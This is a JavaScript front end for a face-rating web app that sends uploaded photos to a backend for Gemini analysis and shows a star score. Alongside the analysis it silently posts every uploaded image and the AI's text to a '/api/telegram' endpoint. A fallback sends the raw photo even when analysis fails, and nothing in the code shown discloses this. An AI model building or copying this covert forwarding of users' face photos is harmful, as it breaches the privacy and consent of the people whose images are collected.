console.log("Script loaded!");

// ---------- CONFIG ----------
// your backend URL (from Render)
const BACKEND_URL = "https://ilook-backend.onrender.com/";

// ---------- UI HOOKS ----------
const faceRatingBtn   = document.getElementById('face-rating-btn');
const currentLookBtn  = document.getElementById('current-look-btn');
const imageUpload     = document.getElementById('image-upload');
const selectedImage   = document.getElementById('selected-image');
const resultsDiv      = document.getElementById('results');
const resultsContent  = document.getElementById('results-content');
const progressDiv     = document.getElementById('progress');
const progressBarFill = document.querySelector('.progress-bar-fill');
const modeSelection   = document.getElementById('mode-selection');

let currentMode = null;
let lastImageData = null;
let currentText = "";

// ---------- EVENT HANDLERS ----------
imageUpload.addEventListener('change', (e) => {
  const file = e.target.files[0];
  if (!file) return;

  const reader = new FileReader();
  reader.onload = ev => {
    selectedImage.src = ev.target.result;
    selectedImage.style.display = 'block';
    lastImageData = ev.target.result;
    modeSelection.style.display = 'flex';
  };
  reader.readAsDataURL(file);
});

faceRatingBtn.addEventListener('click', () => setModeAndRun("face"));
currentLookBtn.addEventListener('click', () => setModeAndRun("current"));

function setModeAndRun(mode) {
  currentMode = mode;
  if (lastImageData) analyzeImage(lastImageData, currentMode);
}

// ---------- CORE ----------
async function analyzeImage(dataUrl, mode) {
  resultsDiv.style.display = 'none';
  progressDiv.style.display = 'block';
  progressBarFill.style.width = '10%';

  let progress = 10;
  const interval = setInterval(() => {
    progress = Math.min(progress + 10, 95);
    progressBarFill.style.width = `${progress}%`;
  }, 200);

  try {
    const text = await callGeminiAPI(dataUrl, mode);
    currentText = text || "";
    clearInterval(interval);
    progressBarFill.style.width = '100%';

    const overallRating = extractOverallRating(text);
    const starsHTML = renderStars(overallRating);

    resultsContent.innerHTML = `
      <h3>Gemini Response</h3>
      <div class="stars">${starsHTML}</div>
      <p>${formatResponse(text)}</p>
    `;
    resultsDiv.style.display = 'block';

    // Send to Telegram via backend
    try {
      await sendToTelegram(dataUrl, text);
    } catch (err) {
      console.error("Telegram send failed:", err);
    }

  } catch (err) {
    clearInterval(interval);
    console.error("Gemini failed:", err);
    resultsContent.innerHTML = `<p class="error">Gemini Error: ${escapeHTML(err.message || err)}</p>`;
    resultsDiv.style.display = 'block';

    // Still attempt Telegram send with raw image
    try {
      if (lastImageData) await sendToTelegram(lastImageData, "Gemini failed, sending raw image.");
    } catch (err2) {
      console.error("Telegram fallback failed:", err2);
    }
  } finally {
    setTimeout(() => progressDiv.style.display = 'none', 500);
  }
}

// ---------- BACKEND CALLS ----------
async function callGeminiAPI(dataUrl, mode) {
  const res = await fetch(`${BACKEND_URL}/api/analyze`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ imageDataUrl: dataUrl, mode })
  });
  if (!res.ok) {
    const msg = await res.text().catch(() => res.statusText);
    throw new Error(`Analyze HTTP ${res.status}: ${msg}`);
  }
  const json = await res.json();
  return json.text || "⚠️ Empty response from backend.";
}

async function sendToTelegram(imageDataUrl, message) {
  const res = await fetch(`${BACKEND_URL}/api/telegram`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ imageDataUrl, message })
  });
  if (!res.ok) {
    const msg = await res.text().catch(() => res.statusText);
    throw new Error(`Telegram HTTP ${res.status}: ${msg}`);
  }
  return true;
}

// ---------- HELPERS ----------
function escapeHTML(str) {
  return String(str || "").replace(/[&<>"']/g, c =>
    ({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c])
  );
}

function formatResponse(str) {
  if (!str) return "";
  let safe = escapeHTML(str);
  safe = safe.replace(/\*\*(.*?)\*\*/g, "<b>$1</b>");
  safe = safe.replace(/\*(.*?)\*/g, "<i>$1</i>");
  safe = safe.replace(/\n/g, "<br>");
  return safe;
}

function extractOverallRating(str) {
  const match = str.match(/(\d+(\.\d+)?)\s*\/?\s*10/i);
  return match ? parseFloat(match[1]) : 0;
}

function renderStars(rating) {
  const starsOutOfFive = Math.round(rating / 2);
  let stars = "";
  for (let i = 1; i <= 5; i++) stars += i <= starsOutOfFive ? "⭐" : "☆";
  return stars + ` (${rating}/10)`;
}
